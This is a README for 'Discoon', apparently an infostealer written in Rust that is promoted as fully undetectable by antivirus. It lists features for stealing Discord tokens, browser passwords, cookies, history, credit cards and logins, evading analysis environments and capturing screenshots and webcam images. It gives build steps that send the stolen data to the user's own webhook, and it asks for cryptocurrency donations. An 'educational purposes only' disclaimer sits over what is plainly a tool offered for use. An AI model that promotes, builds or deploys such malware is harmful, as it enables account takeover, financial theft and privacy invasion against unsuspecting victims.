# Discoon
FUD malware with a backend written in Rust

## Educational purposes only
This demonstrates how malware can be created in Rust. Making malware in a language where it's not usual means lower detection rates since the signature is different from lot of popular malware. **Only use this on your own machine and do not use it on other people maliciously**. 

### Features
- `Anti analysis` detects some malware analysis environemnts
- `Webhook protection` sends to webhook through a backend making your webhook protected
- `Trace token` sends new user token when they change user data also steals credit cards and login information
- `Steal discord tokens` steal and decrypt discord tokens (self explanatory)
- `Steal browser passwords` steals browser passwords (self explanatory)
- `Steal browser cookies` steals browser cookies (self explanatory)
- `Steal browsing history` steals browsing history (self explanatory)
- `Take screenshot` takes a screenshot (self explanatory)
- `Take webcam image` takes a webcam image (self explanatory)
- `Fully undetectable` this is fully undetectable by anti viruses for now

### How to use
1. Open it in vscode or your preferred IDE
2. Goto `constants.rs` and find the `WEBHOOK` field
3. Set the webhook to your webhook
4. Set the options in `constants.rs`
5. Run (x64) `cargo build --release` or (x86) `cargo build --release --target=i686-pc-windows-msvc`
6. Done

### Contributing
1. Fork it
2. Create your branch (`git checkout -b my-change`)
3. Commit your changes (`git commit -am 'changed something'`)
4. Push to the branch (`git push origin my-change`)
5. Create new pull request (PR)

### Donating
- BTC: `bc1qclp38ttjy3nad0r5ca2skkjtyrma7ssg2ctady`
- ETH: `0x1DC20DB2985b14cA483071c29dC0eDdCbF100019`
- LTC: `LTtv4qaKDXUaqFjzzBFDLhYUiMTHQtV1Rc`
